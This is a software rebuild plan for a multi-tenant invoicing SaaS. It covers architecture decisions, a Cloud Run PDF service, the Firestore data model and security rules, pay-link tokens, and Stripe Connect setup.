# TechFlow SaaS — Rebuild Plan

**Status:** Planning locked, execution not started
**Date:** 2026-04-11
**Owner:** Reggie (solo dev)
**Scope:** Full rebuild of TechFlow Solutions invoicing SaaS into a multi-tenant Next.js + Tailwind app on a new repo, one pass, pre-launch.

---

## TL;DR — Decisions Locked

1. **Rebuild strategy:** One pass. New repo. Next.js 15 (App Router) + Tailwind + multi-tenant Firebase from day one. No intermediate Vite multi-tenant step.
2. **Scale target:** 50+ clients. Clone-per-client model is abandoned.
3. **Hosting:** Vercel Pro ($20/mo) for the Next.js app. PDF generation is NOT on Vercel — it runs on a dedicated Cloud Run service (see item 4).
4. **PDF generation:** Dedicated **Cloud Run** service running full Chrome + Puppeteer in a Docker container. Not Vercel. Separate microservice, protected by an API key, called from the Next.js app. This choice is locked — see "PDF Generation Strategy" section below.
5. **Firestore schema:** Nested per-tenant subcollections — `tenants/{tenantId}/invoices/{id}`, etc. Path-based tenant isolation.
6. **Tenant routing:** Implicit from auth claims. User logs in, `tenantId` is in their JWT, all queries scope to it. URLs stay generic (`/dashboard`, `/invoices`). Path/subdomain routing deferred.
7. **Stripe model:** Stripe Connect Express. Tenants onboard their own Stripe account; platform takes no fee initially (toggleable later).
8. **Feature flags / entitlements:** Baked in from day one. Separate `entitlements` sub-document per tenant (platform-admin-only). Canonical feature list lives in code, tenant docs only store overrides. Frontend and Cloud Functions both enforce.
9. **CSS:** Tailwind. No plain CSS files. No `@import` chains.
10. **Customer portal access:** Contractors' end-customers (the homeowners being invoiced) authenticate via Firebase Auth magic link, have **no `tenantId` claim**, and can only read invoices/quotes where the document's `customer.email` matches their verified auth email. Separate `/portal` route group. Same auth backend, different authorization pattern.
11. **Firestore backup strategy:** Multi-tenant means one blast radius. Daily scheduled exports to Cloud Storage (30-day retention) + PITR (7 days) + documented manual-snapshot-before-risky-deploy convention. Enabled from day one, not "later."
12. **Pre-launch reality:** Zero real customers, zero real revenue. Current Firestore data is test-only and can be discarded. No regression risk from rewriting money-handling code.

---

## ⚠️ Old-Repo Shutdown Checklist (Path A decided 2026-04-11)

Old Vite repo has unauthenticated callables (`previewInvoicePDF`, `previewQuotePDF`, `sendQuoteEmail`, `sendInvoiceEmail`, `createCheckoutSession`). No real customers, pre-launch Stripe account → accepting the risk window rather than patching. **On rebuild launch day:** delete the old Firebase project (or at minimum its Cloud Functions) AND take down the old GitHub Pages site. Both required — not one or the other. Rebuild enforces `auth + tenantId + featureGate` natively from commit 1.

---

## Background — Why This Rebuild

### Current stack (being replaced)
- Vite 7.3.1 + React 19.2.0, plain CSS per component
- Firebase Auth + Firestore (single project per client, clone model)
- Firebase Cloud Functions (email via Zoho, Stripe, recurring invoices, invoice numbering)
- Cloud Run + Puppeteer for PDF (shared across all clients)
- GitHub Pages per client, GitHub Actions deploy
- 15-phase manual clone process per new client

### Problems with current architecture
- **Clone-per-client is operational debt that compounds per client.** Pushing one bug fix means N manual deploys. Config drift is inevitable. At 10+ clients it becomes a full-time release-management job for a solo dev.
- **Per-client Firebase projects** = per-client billing, quotas, bug triage, DNS, OAuth setup.
- **Plain CSS with `@import` chains** has already caused real cascade/specificity bugs (the `.form-group { margin: 0 }` leak from ServiceCalculator that wiped CustomerSection's spacing).
- **Stack drift** with the main marketing site, which is already on Next.js + Tailwind on Vercel. Standardizing cuts cognitive overhead and unifies the dev surface.
- **No data migration penalty** because no real customers exist yet — pre-launch is the only cheap window for this rebuild.

### Bundled website + portal offering (why branding is critical)
TechFlow's go-to-market is a **bundled service**: Reggie builds the client's website AND their invoice portal together as a package. Because TechFlow builds their website too, the portal must match the client's brand exactly — same colours, same fonts, same logo, same feel. This is not a nice-to-have; it's core to the product. A portal that looks like "TechFlow" instead of "Smith Plumbing" undermines the bundled pitch. This is why:
- Full branding fields (`primaryColor`, `secondaryColor`, `fontFamily`, `logoUrl`, `faviconUrl`) are required from Phase 1, not deferred.
- Custom domain support (`invoices.smithplumbing.ca`) is a Phase 5 deliverable, not post-launch.
- The customer-facing login page must render the tenant's branding when accessed via a custom domain.

### Why not a smaller step (Vite multi-tenant first, Next.js later)
Two rebuilds = ~10 weeks total and two transition states. One rebuild into the final stack = ~6–8 weeks and one transition state. Same queries, same security rules, same Cloud Function auth — but written once in the destination stack.

---

## PDF Generation Strategy — Cloud Run (locked)

### Why Cloud Run, not Vercel

PDF generation runs as a **dedicated Cloud Run microservice**, not inside the Vercel app. This was evaluated against the Vercel + `@sparticuz/chromium` alternative and Cloud Run wins for this app:

- **Already working.** The old Vite repo's Cloud Run PDF service works today. Porting it beats rebuilding PDF rendering on a new platform.
- **Full Chrome in Docker, no hacks.** A standard Dockerfile installs stable Google Chrome. No `@sparticuz/chromium` binary, no version-pinning dance against `puppeteer-core` majors, no Next.js `serverExternalPackages` config, no 250 MB bundle ceiling to tiptoe around.
- **Real RAM headroom.** Cloud Run allows 2–32 GB per instance. Vercel Pro tops out at ~3 GB per function. Puppeteer spikes on complex invoices (many line items, custom fonts) can trip Vercel's ceiling and return silent failures.
- **Separation of concerns.** Vercel stays lean (UI + lightweight API routes). The heavy-lifting PDF service can be scaled, monitored, and redeployed independently. Classic microservice split.
- **Load distribution.** Keeps Vercel function concurrency for user-facing requests instead of burning it on 3–5-second PDF renders.
- **Local dev parity.** `docker run` locally is byte-identical to prod. Vercel's sparticuz Chromium isn't what runs on your dev machine.

### Service shape

```
pdf-service/
  Dockerfile                   ← base image with Chrome stable pre-installed
  package.json
  src/
    index.ts                   ← small Express (or Hono) app
    renderInvoice.ts           ← Puppeteer render logic
    renderQuote.ts
```

- Deployed as a single Cloud Run service per environment (`pdf-service-dev`, `pdf-service-staging`, `pdf-service-prod`).
- Memory: 2 GB. vCPU: 2. Concurrency: 10–20 per instance (Chrome is not thread-safe but one instance can handle multiple serialized requests).
- `min-instances: 0` for dev/staging (scales to zero), `min-instances: 1` for prod if cold starts become a UX problem (costs a few dollars a month for always-warm).

### Auth — API key + Firebase ID token forwarding

The Cloud Run service is NOT publicly open. Two layers:

1. **Cloud Run `PDF_SERVICE_API_KEY`** — a shared secret between the Next.js app and the PDF service. Next.js sends `X-Api-Key: <secret>`. PDF service rejects anything else with 401. Prevents randoms from hitting the endpoint and running up bills.
2. **Firebase ID token forwarding** — the Next.js route that proxies to Cloud Run does the dual-auth check FIRST (tenant user vs customer email match, per Phase 6), then forwards the verified invoice payload + snapshot to Cloud Run. Cloud Run does NOT re-verify Firebase tokens — it trusts the gating done by the Next.js route. The API key is what protects Cloud Run itself.

This keeps PDF service stateless and fast: it receives `{ html, snapshot }` (or `{ invoiceData }`) and returns a PDF buffer. All tenant/customer authorization happens upstream.

### Dockerfile sketch

```dockerfile
FROM node:20-slim

# Install Chrome stable + fonts
RUN apt-get update && apt-get install -y \
    google-chrome-stable \
    fonts-liberation fonts-noto-color-emoji \
    --no-install-recommends \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production
COPY . .

ENV PUPPETEER_EXECUTABLE_PATH=/usr/bin/google-chrome-stable
EXPOSE 8080
CMD ["node", "src/index.js"]
```

(Final Dockerfile tuning — user namespace, non-root user, sandbox flags — happens during Phase 6 porting, not now.)

### Env vars (set per Cloud Run service)

- `PDF_SERVICE_API_KEY` — shared secret
- `NODE_ENV` — `production`

### Next.js side

- `/api/pdf/invoice/route.ts` and `/api/pdf/quote/route.ts` are **thin proxies**:
  1. Verify Firebase ID token (dual auth: tenant vs customer)
  2. Feature-gate check (`invoices` / `quotes` enabled for the target tenant)
  3. Load invoice/quote doc from Firestore (server-side with Admin SDK)
  4. POST to Cloud Run with `{ snapshot, data }` + `X-Api-Key`
  5. Stream the PDF buffer back to the caller
- Env var: `PDF_SERVICE_URL` (e.g. `https://pdf-service-prod-abc123.a.run.app`) and `PDF_SERVICE_API_KEY`, set per Vercel environment scope.

### Deployment

- `gcloud run deploy pdf-service-prod --source ./pdf-service --region us-central1` (or whichever region the Firebase project lives in).
- One service per environment (dev/staging/prod), same as Firebase projects.
- Script this alongside the Cloud Functions deploy script (see "Environment Strategy" → Cloud Functions deployment).

### No Puppeteer test on Vercel

The previously-planned 30–60 min Puppeteer test on the marketing site is **removed**. It was testing a path we're not taking. Immediate Next Steps drops that item; Phase 1 can start without it.

---

## Phase 0 — Decisions Before Any Code

All confirmed:

| Question | Decision |
|---|---|
| Schema shape | **Nested subcollections** — `tenants/{tenantId}/invoices/{id}` |
| Tenant routing | **Implicit from auth claims.** `tenantId` in JWT, queries scope automatically |
| Stripe model | **Stripe Connect Express.** Tenants onboard via Stripe, money flows to their account |
| Feature flags | **Separate `entitlements` sub-doc, platform-admin-only, code-canonical feature list** |
| Branding surface | **Full branding required from Phase 1.** Name, logo, address, email-from, primaryColor, secondaryColor, fontFamily, faviconUrl. Not deferred — core to the bundled website + portal offering |
| Custom domains | Field in meta from Phase 1. Vercel domain provisioning + branded login middleware in Phase 5. Two tiers: generic `portal.techflowsolutions.ca` (immediate) and custom `invoices.smithplumbing.ca` (DNS + SSL) |
| tenantSnapshot policy | **Frozen at creation time (legal document approach).** Invoices/quotes embed a branding snapshot when created. If a contractor rebrands later, old documents keep the branding they were sent with. This is correct for tax/legal documents and avoids cross-doc reads in security rules. PDFs always render from the snapshot, never from current `meta`. |
| Environment strategy | **Separate Firebase projects for dev/staging/prod.** Stripe test vs live keys per Vercel environment scope. See "Environment Strategy" section below Phase 7. |
| CSS approach | Tailwind only. No plain CSS files |
| Stack | Next.js 15 App Router + Tailwind + TypeScript |

---

## Decisions Required Before Phase 1 Starts

These are not "open questions to answer later" — they block Phase 1 setup and must be resolved before the first Firebase project is provisioned or the first line of code is written.

### 1. Generic portal domain: subdomain of marketing site vs separate Vercel project

**The decision:** Where does `portal.techflowsolutions.ca` (the generic portal URL) live?

**Option A — Same Vercel project as the marketing site.**
- Pros: one deployment, one set of env vars, single Firebase Auth authorized domain for the root domain.
- Cons: the Next.js middleware (which resolves tenant from custom domains) would run on EVERY request including marketing pages. Adds latency and a Firestore read to every marketing page load. Middleware has to be careful to early-return for marketing hostnames. Couples the marketing site's deploy cadence to the portal's.

**Option B — Separate Vercel project.**
- Pros: marketing site stays simple, no middleware on marketing routes. Portal can deploy independently. Clean separation of concerns.
- Cons: two Vercel projects to maintain, two sets of env vars, two Firebase Auth authorized domains lists (though both point to the same Firebase project). Slight DNS complexity (marketing site on `techflowsolutions.ca`, portal on `portal.techflowsolutions.ca` — CNAME to a different Vercel project).

**Recommendation:** Option B (separate Vercel project). The marketing site and the portal are fundamentally different apps with different deploy risk profiles. The per-request middleware cost is small in absolute terms but there's no reason to pay it on marketing pages. Two Vercel projects is trivial overhead for a solo dev.

**✅ RESOLVED 2026-04-13 — Option A (single Vercel project).** Decision made jointly with Gemini review. Rationale: middleware-based host routing is the industry-standard pattern at this scale; single project keeps CI/CD, env vars, and shared utility code (brand contrast logic, tenant resolver, etc.) in one place. The per-request middleware cost is mitigated by early-return for known marketing hostnames. Reconsider splitting only if marketing-page latency becomes measurable.

### 2. Path A vs Path B for old-repo security debt

Already decided — see "Outstanding Security Debt" section above. Path A (ship rebuild, delete old project on launch day). Listed here for completeness so this section is a single checklist of pre-Phase-1 decisions.

### 3. Transactional email provider — Zoho vs Resend/Postmark

**The decision:** Which service sends invoice emails, magic links, and staff invitations? This blocks Phase 2 (`sendInvoiceEmail` cannot be written without knowing the From address and SDK).

**Option A — Keep Zoho (current platform sender).**
- Pros: zero new services to learn, existing Zoho account works, cheap.
- Cons: **high reputation risk at multi-tenant scale.** Zoho is a standard mailbox provider, not a transactional ESP. If one tenant's invoices get flagged as spam (aggressive collections, too-many-recipients, bad-text patterns), Zoho throttles or blocks the sending address — affecting *every other tenant*. One bad actor poisons the platform. Deliverability is mediocre for bulk-ish sends. No built-in bounce/complaint handling.

**Option B — Switch to Resend or Postmark (transactional ESP).**
- Pros: built for exactly this pattern (multi-tenant SaaS sending on behalf of customers). Clean IPs, proper DKIM/SPF alignment, bounce + complaint webhooks, per-domain reputation so one tenant's bad sends can't tank another's. Easy SDK. Both have generous free tiers (Resend: 3k/month, Postmark: 100/month then $1.25/1000).
- Cons: one more SaaS dependency, one more API key per environment.

**Reply-To strategy (applies either way):**
- `From:` `notifications@techflowsolutions.ca` (or equivalent — the platform's single verified sender)
- `Reply-To:` the tenant's own email from `meta` (e.g. `contractor@smithplumbing.com`)
- End customers hit "Reply" and it goes to the contractor, not to Reggie. This is non-negotiable for a bundled-website offering.

**Recommendation:** Option B — Resend. It's built for this, free tier covers MVP, and it's the single biggest deliverability risk-mitigation the plan can make. Postmark is also fine but Resend has the nicer DX.

**✅ RESOLVED 2026-04-13 — Resend.** Decision made jointly with Gemini review. Rationale: pairs natively with React Email (the template system locked in Phase 2) — templates are JSX components using the same design tokens as the dashboard, so a "Paid" badge in an email renders identically to one in the portal. Eliminates hand-rolled HTML tables. Free tier (3k/month) covers MVP.

**Downstream changes if Option B is adopted:**
- Replace `ZOHO_EMAIL_USER` / `ZOHO_EMAIL_PASSWORD` env vars with `RESEND_API_KEY`.
- `sendInvoiceEmail`, `sendQuoteEmail`, `sendMagicLinkEmail` (wrapper), and `createInvitation` all use the Resend SDK with `from: notifications@...`, `replyTo: meta.emailFrom || meta.emailFooter`.
- Verify `techflowsolutions.ca` as a sending domain in Resend (DKIM + SPF + DMARC records in DNS).

**Status:** Needs Reggie's decision before Phase 2.

---

## Phase 1 — Data Model, Auth Claims, Security Rules

### Firestore structure

```
tenants/{tenantId}
  ├─ meta                         (doc)  ← tenant-editable (read by tenant admins only)
  │    {
  │      name, logoUrl, address,              ← logoUrl is the public https download URL
  │                                             returned by Firebase Storage getDownloadURL(),
  │                                             NOT the Storage path. Customers cannot read
  │                                             Storage directly, so the stored value must be
  │                                             the token-bearing public URL.
  │      primaryColor, secondaryColor,        ← branding (required from Phase 1)
  │      fontFamily,                          ← e.g. "Inter", "DM Sans" — matches client website
  │      faviconUrl,                          ← tenant favicon for portal + PDF
  │      customDomain,                        ← e.g. "invoices.smithplumbing.ca" (null until configured)
  │      customDomainStatus: {                ← null until customDomain is set. Shape:
  │        stage,                               { stage: 'pending-dns' | 'pending-ssl' |
  │        message,                                        'verified' | 'error',
  │        checkedAt                            message: string | null, checkedAt: timestamp }.
  │      },                                     Updated by `setupCustomDomain` + the scheduled
  │                                             re-check function. Surfaced in /settings/domain.
  │      taxRate, taxName,                    ← e.g. 0.13, "HST"
  │      businessNumber,                      ← GST/HST registration, VAT ID, etc.
  │      invoicePrefix,                       ← e.g. "INV" or "ACME"
  │      emailFooter,                         ← appended to outgoing invoice emails
  │      currency,                            ← ISO 4217, e.g. "CAD", "USD"
  │      stripeAccountId,                     ← Stripe Connect account ID
  │      stripeStatus: {                      ← mirrors Stripe Connect account state so the
  │        chargesEnabled,                       app can preflight payInvoice + show a banner
  │        payoutsEnabled,                       when charges are disabled. Populated by the
  │        detailsSubmitted,                     platform webhook `account.updated` handler
  │        currentlyDue: [],                     (Phase 4). Shape exists in Phase 1 so Phase 2
  │        disabledReason,                       can read it without refactor. Null-equivalent
  │        updatedAt                             defaults written by onSignup: chargesEnabled
  │      },                                      false until Connect onboarding completes.
  │      etransferEmail,                      ← tenant's Interac e-Transfer email (shown to
  │                                             customers on the pay page as primary method)
  │      chargeCustomerCardFees,              ← boolean, default false — when true, passes
  │                                             credit-card processing fee to customer as a
  │                                             separate line item on Stripe Checkout
  │      cardFeePercent,                      ← number, default 2.4, HARD-CAPPED at 2.4 —
  │                                             Visa/Mastercard Canadian ceiling. Only used
  │                                             when chargeCustomerCardFees === true
  │      surchargeAcknowledgedAt,             ← timestamp of one-time modal acknowledgment
  │                                             (Visa/Mastercard notification responsibility,
  │                                             Quebec exclusion, 2.4% cap). Null until the
  │                                             tenant enables surcharging for the first time.
  │      deletedAt,                           ← null unless tenant soft-deleted
  │      createdAt
  │    }
  │
  ├─ entitlements                 (doc)  ← PLATFORM ADMIN ONLY (read by tenant)
  │    { features: { quotes: true, ... }, plan: 'free'|'starter'|'pro',
  │      limits: { maxInvoicesPerMonth: 10 }, updatedAt }
  │
  ├─ counters/invoiceCounter      (doc)
  ├─ counters/quoteCounter        (doc)
  ├─ customers/{id}                       ← includes deletedAt (null unless soft-deleted)
  ├─ invoices/{id}                        ← EMBEDS tenant branding snapshot (see below);
  │                                         includes deletedAt (null unless soft-deleted)
  ├─ quotes/{id}                          ← EMBEDS tenant branding snapshot (see below);
  │                                         includes deletedAt (null unless soft-deleted)
  ├─ recurringInvoices/{id}
  └─ invitations/{inviteId}               ← staff invitation tokens (see Phase 5)
       {
         email, role, token (hashed),
         invitedBy (uid), createdAt,
         expiresAt, acceptedAt (null until used)
       }

users/{uid}
  └─ { primaryTenantId,                   ← MVP: pointer into userTenantMemberships used to set
                                             the `tenantId` custom claim. Post-MVP multi-tenant
                                             UI will let the user switch active tenant; this
                                             field is the server-of-record for which one their
                                             current ID token is scoped to.
       email }                            ← tenant users only — customers have no doc here

userTenantMemberships/{uid}_{tenantId}    ← one doc per (user, tenant) pair. MVP writes exactly
                                             one per user (the one created by onSignup), but
                                             having the collection from day one avoids a painful
                                             migration when bookkeepers/VAs need multi-tenant
                                             access (P7 in DEFERRED).
  └─ {
       uid, tenantId,                     ← both duplicated in the doc for collectionGroup queries
       role,                              ← 'owner' | 'admin' | 'member' — scoped to THIS tenant
       invitedBy,                         ← uid of inviter (null for the owner created by onSignup)
       createdAt,
       deletedAt                          ← null unless revoked; soft-delete so audit log survives
     }

customDomains/{domain}            ← e.g. "invoices.smithplumbing.ca"
  └─ { tenantId }                         ← reverse lookup: domain → tenantId
                                            Written by platform admin or onSignup Cloud Function
                                            when customDomain is set in tenant meta.
                                            Used by Next.js middleware to resolve branding
                                            before auth (login page must show tenant brand).

stripeAccounts/{stripeAccountId}  ← e.g. "acct_1Abc..."
  └─ { tenantId }                         ← reverse lookup: Stripe Connect account → tenantId.
                                            Written by the Stripe Connect return-URL handler
                                            (Phase 4 step 3) at the same time stripeAccountId
                                            is written to tenant meta. Used by the Stripe
                                            webhook to route Connect events to the correct
                                            tenant WITHOUT a collectionGroup('meta') query
                                            (which would require a composite index and still
                                            be slower than a direct doc read).

platformAdmins/{uid}              ← optional; or use custom claim only
```

### Invoice/quote branding snapshot (denormalization rule)

**Every invoice and quote document embeds a `tenantSnapshot` subfield at creation time**, containing the fields the customer portal needs to render the document without reading `meta`:

```typescript
{
  // ... invoice data (customer, lineItems, totals, status, etc.) ...

  tenantSnapshot: {
    name, logo, address,                   // ← `logo` is an inlined base64 data URL frozen at
                                           //   snapshot time. See "Immutable logo snapshot" in
                                           //   Phase 6 — storing the current mutable Storage
                                           //   URL breaks historical PDFs when the tenant
                                           //   rotates or deletes their logo file.
    primaryColor, secondaryColor,
    fontFamily, faviconUrl,                // ← new: full branding
    taxRate, taxName, businessNumber,
    emailFooter, currency,
    // NOTE: stripeAccountId intentionally NOT snapshotted.
    // It's read server-side from meta at checkout creation time.
    // NOTE: customDomain intentionally NOT snapshotted.
    // Domain routing is resolved by middleware, not by invoice docs.
  }
}
```

**Why snapshot instead of reading `meta` from the customer portal:**
1. **Simpler rules.** Customers only need read access to their own invoices, not to tenant meta. One rule covers it.
2. **Correct historical behavior.** If a contractor rebrands (new logo, new tax rate, new business number) six months after an invoice was sent, the old invoice still renders with the branding it had at send time. This is what customers expect and what regulators expect for tax documents.
3. **Avoids cross-doc `get()` in rules.** Rules-level `get()` calls are expensive and rate-limited. Snapshotting keeps rule evaluation to a single-doc read.

Snapshot is written by the Cloud Function at invoice/quote creation time, not by the client. Client never has permission to write `tenantSnapshot` directly.

### Invoice pay-link fields (no-auth payment flow)

Every invoice document carries a **signed pay-link token** so customers can pay directly from the email without going through the portal magic-link auth flow. This is the industry standard (Stripe Invoicing, QuickBooks, FreshBooks) — forcing customers through auth to pay a single bill measurably increases days-to-payment.

Added to the invoice doc at creation time (by the `createInvoice` Cloud Function, admin SDK only):

```typescript
{
  // ... existing invoice fields ...
  payToken,                 // JWT signed with a secret — see Phase 2
                            // Payload: { invoiceId, tenantId, exp }
                            // Verified by the public /pay/[token] route without
                            // requiring Firebase auth.
  payTokenExpiresAt,        // Timestamp, default issueDate + 60 days.
                            // Token is invalidated on invoice status = 'paid'
                            // or on explicit regeneration from dashboard.
  payTokenVersion,          // Integer, default 1. Incremented when a tenant
                            // "regenerates pay link" from the dashboard, which
                            // invalidates prior tokens for the same invoice.
                            // Stored inside the JWT payload; mismatch on verify → reject.
}
```

Why a JWT instead of a random token stored in Firestore: the verify path on every pay-page load would otherwise be a Firestore read per click. With a JWT, the pay page verifies with a single HMAC check — no database hit on the hot path. The Firestore-side `payTokenVersion` is only read when the checkout session is actually created (after the customer clicks "Pay"), so invalidation still works but the read cost is one per actual payment attempt, not one per page view.

### Auth custom claims

Set via `admin.auth().setCustomUserClaims()` at signup time and whenever a user's role changes:

```typescript
{
  tenantId: "acme-plumbing",
  role: "owner" | "admin" | "member"
}
```

Separate claim for platform admins (just Reggie):
```typescript
{ role: "platform_admin" }
```

Platform admins have no `tenantId` claim. They're the only role that can write `entitlements`.

### Security rules (sketch)

Two distinct auth identity patterns are enforced at the rules layer:

- **Tenant users** (contractors + their staff) have a `tenantId` custom claim and a role of `owner`/`admin`/`member`. They see everything under their tenant path.
- **Customer users** (homeowners being invoiced) have **no `tenantId` claim**. They authenticate via magic link, their auth token carries `email` + `email_verified`. They can only read invoices/quotes whose `customer.email` matches their verified email. They cannot write anything. They cannot read `meta`, `entitlements`, `counters`, `customers`, or `recurringInvoices`.

```
rules_version = '2';
service cloud.firestore {
  match /databases/{database}/documents {

    // Tenant-editable meta — tenant admins only.
    // Customers never read meta; they read tenantSnapshot embedded in their invoice/quote.
    match /tenants/{tenantId}/meta {
      allow read:  if request.auth.token.tenantId == tenantId;
      allow write: if request.auth.token.tenantId == tenantId
                   && request.auth.token.role in ['owner', 'admin'];
    }

    // Entitlements — read by tenant, write by platform admin only
    match /tenants/{tenantId}/entitlements {
      allow read:  if request.auth.token.tenantId == tenantId;
      allow write: if request.auth.token.role == 'platform_admin';
    }

    // Invoices — read by tenant users OR the matching customer.
    // WRITES ARE ADMIN-SDK-ONLY. All mutations (create, update, delete, status
    // changes, payment marking) go through Cloud Functions: createInvoice,
    // updateInvoice, deleteInvoice, markInvoicePaid. This is the C1 fix from
    // round 3 audit — preventing client write means tenantSnapshot, taxRate,
    // businessNumber, and totals cannot be tampered with after creation.
    // Email comparison uses lowercase normalization on BOTH sides — see C2 fix.
    match /tenants/{tenantId}/invoices/{invoiceId} {
      allow read: if
        // Tenant user
        (request.auth.token.tenantId == tenantId
         && request.auth.token.role in ['owner', 'admin', 'member'])
        // OR customer whose verified email matches the invoice's customer.email.
        // Both sides lowercased — Cloud Functions write customer.email lowercased,
        // and we compare against lowercase(auth.token.email) here.
        || (request.auth.token.email_verified == true
            && request.auth.token.email.lower() == resource.data.customer.email);
      allow write: if false;  // admin SDK only — see Phase 2 invoice CRUD callables
    }

    // Quotes — same pattern as invoices. Writes admin-SDK-only.
    match /tenants/{tenantId}/quotes/{quoteId} {
      allow read: if
        (request.auth.token.tenantId == tenantId
         && request.auth.token.role in ['owner', 'admin', 'member'])
        || (request.auth.token.email_verified == true
            && request.auth.token.email.lower() == resource.data.customer.email);
      allow write: if false;  // admin SDK only — see Phase 2 quote CRUD callables
    }

    // Customers collection, counters, recurringInvoices — tenant-only, no customer access
    match /tenants/{tenantId}/customers/{doc} {
      allow read, write: if request.auth.token.tenantId == tenantId
                         && request.auth.token.role in ['owner', 'admin', 'member'];
    }
    match /tenants/{tenantId}/counters/{doc} {
      allow read:  if request.auth.token.tenantId == tenantId;
      allow write: if false;  // counters only written by Cloud Functions via admin SDK
    }
    match /tenants/{tenantId}/recurringInvoices/{doc} {
      allow read, write: if request.auth.token.tenantId == tenantId
                         && request.auth.token.role in ['owner', 'admin', 'member'];
    }

    // User profile — tenant users only have docs here; customers do not.
    // WRITES ARE ADMIN-SDK-ONLY. The user doc carries tenantId and role,
    // which are authorization-adjacent fields. Allowing client writes would
    // let a user spoof their own tenantId/role (it wouldn't change the JWT
    // claim, but any code that reads users/{uid} for auth decisions would be
    // wrong). All writes go through onSignup, setUserRole, onAcceptInvite.
    // Profile self-edits (display name, etc.) get a dedicated callable
    // updateUserProfile that whitelists editable fields. C6 fix from round 3.
    match /users/{uid} {
      allow read:  if request.auth.uid == uid;
      allow write: if false;  // admin SDK only
    }

    // customDomains — reverse lookup for middleware. Admin-SDK-only.
    // Client-side code must NEVER read this directly. The Next.js middleware
    // runs server-side with admin credentials (bypasses rules) and injects
    // the resolved tenantId into request headers/cookies. The branded login
    // page reads tenant branding via a dedicated Cloud Function (or from a
    // public-read subset) — not from customDomains.
    match /customDomains/{domain} {
      allow read, write: if false;  // admin SDK only
    }

    // stripeAccounts — reverse lookup for Stripe Connect webhook. Admin-SDK-only.
    // Written at Connect return time alongside tenant meta.stripeAccountId.
    // Read only by the webhook handler (server-side, admin credentials).
    match /stripeAccounts/{stripeAccountId} {
      allow read, write: if false;  // admin SDK only
    }

    // Invitations — tenant owners/admins can create/read/revoke; acceptance
    // happens via a Cloud Function (onAcceptInvite) that runs under admin SDK
    // and verifies the hashed token. Clients never write acceptedAt directly.
    match /tenants/{tenantId}/invitations/{inviteId} {
      allow read, write: if request.auth.token.tenantId == tenantId
                         && request.auth.token.role in ['owner', 'admin'];
    }
  }
}
```

### Critical rule properties
1. **Customer access is read-only.** The `|| email_verified` branch only appears in `allow read`, never in `allow write`.
2. **Customer access is per-document.** A customer reading invoice X cannot list or enumerate other invoices — Firestore rules don't grant collection-level reads from a single-doc match. Customer-portal queries must use direct document reads or filtered queries where the rule matches each returned doc individually (see "Customer portal queries" below).
3. **`email_verified` is load-bearing.** Magic-link auth sets this automatically. If a customer signs in with unverified email, they get nothing. Rules must always require `email_verified == true` on the customer branch.
4. **Customers cannot read `meta`, `entitlements`, `customers` collection, or `recurringInvoices`.** All branding they need is denormalized into `tenantSnapshot` on the invoice/quote they're reading.
5. **Counter writes are blocked at the rules layer** — only admin SDK (Cloud Functions) can write counters, which matches the race-safe `consumeNumber()` pattern.
6. **Invoice/quote/user writes are admin-SDK-only.** Direct client writes are blocked. All mutations flow through Cloud Function callables that validate inputs, enforce tax math, and lock fields the client must never set (`tenantSnapshot`, `createdAt`, `tenantId`, `status` transitions). Prevents the C1 / C6 forgery class entirely. Full callable list in Phase 2.
7. **Email comparison is case-insensitive by convention.** Customer emails are stored lowercase (Cloud Functions normalize at write boundary). Auth tokens carry whatever case the user signed in with, so rules call `request.auth.token.email.lower()` before comparing. **Both sides must agree on lowercase.** A non-normalized write at any path will silently break customer access.

### Customer portal queries — the list-access workaround

A customer landing on `/portal` needs to see their own list of invoices across whichever tenants have invoiced them. Firestore rules can't grant list access based on a document field match alone — `list()` queries require the rule to match the *query constraints*, not the returned docs.

**Pattern:** use `collectionGroup('invoices')` queries filtered by `customer.email == auth.token.email`:

```typescript
// Customer portal query
db.collectionGroup('invoices')
  .where('customer.email', '==', currentUser.email)
  .orderBy('createdAt', 'desc')
```

With a matching rule addition:
```
match /{path=**}/invoices/{invoiceId} {
  allow list: if request.auth.token.email_verified == true
              && request.query.limit <= 100
              && 'customer.email' in request.query.filters
              && request.query.filters['customer.email'] == request.auth.token.email;
}
```

The actual syntax for query-constraint checks in Firestore rules has some quirks — finalize this rule against the Firebase emulator before deploying. The conceptual pattern is: require the query to filter on `customer.email` equal to the caller's auth email, and enforce a reasonable `limit`.

A simpler fallback if the `request.query` pattern proves fragile: have a Cloud Function `getCustomerInvoices()` that runs with admin SDK, verifies the caller's auth email, and returns the list. Trades rule-level security for function-level security, but it works and is easier to reason about.

**Decision deferred to Phase 1 implementation:** start with the Cloud Function approach (`getCustomerInvoices`), migrate to `collectionGroup` + rules if the function hits latency issues.

### Data migration
No migration needed. Existing Firestore data is 73 test invoices — discarded. Fresh start in the new Firebase project.

**Deliverables for Phase 1:**
- New Firebase project provisioned (`techflow-dev`)
- Firestore rules deployed
- **Firestore indexes deployed (`firestore.indexes.json`)** — required from day one. The `getCustomerInvoices` query uses a `collectionGroup('invoices')` query with `.where('customer.email', '==', email).orderBy('createdAt', 'desc')`. Without a composite index defined for this collection group, Firestore throws a runtime error on the first customer portal query. Known required indexes:
  - Collection group `invoices`: `customer.email` (ASC) + `createdAt` (DESC)
  - Collection group `quotes`: `customer.email` (ASC) + `createdAt` (DESC) (same pattern for customer quote access)
  - Add additional indexes as queries are finalized in Phase 2. The `firestore.indexes.json` file lives in the repo and is deployed alongside rules via `firebase deploy --only firestore`.
  - **Note:** the Stripe webhook does NOT require a `collectionGroup('meta')` index because we use the `stripeAccounts/{stripeAccountId}` reverse lookup collection instead. Direct doc read, no composite index needed.
- **Firebase Storage rules deployed (`storage.rules`)** — separate from Firestore rules. Firebase Storage has its own rules file. Required rules:
  - Tenant users can read/write files under `tenants/{tenantId}/` where their token's `tenantId` matches
  - Customers cannot access Storage directly. Logos and favicons are served via **Firebase Storage public download URLs** (generated by `getDownloadURL()` at upload time). The download URL includes an access token in the query string and is publicly fetchable without Storage rules, which is why the URL itself (not the Storage path) must be what's stored in `meta.logoUrl` / `meta.faviconUrl` and snapshotted into `tenantSnapshot.logoUrl`. If the Storage path is stored instead, customers' PDFs and portal pages will silently 403 on the logo.
  - No unauthenticated access to the Storage bucket itself
- Custom-claim helpers in Cloud Functions for signup + role changes
- Platform admin user created (Reggie) with `role: platform_admin` claim

**Estimated effort:** 4–5 days

---

## Phase 1.5 — Design System (shadcn/ui + tenant theming)

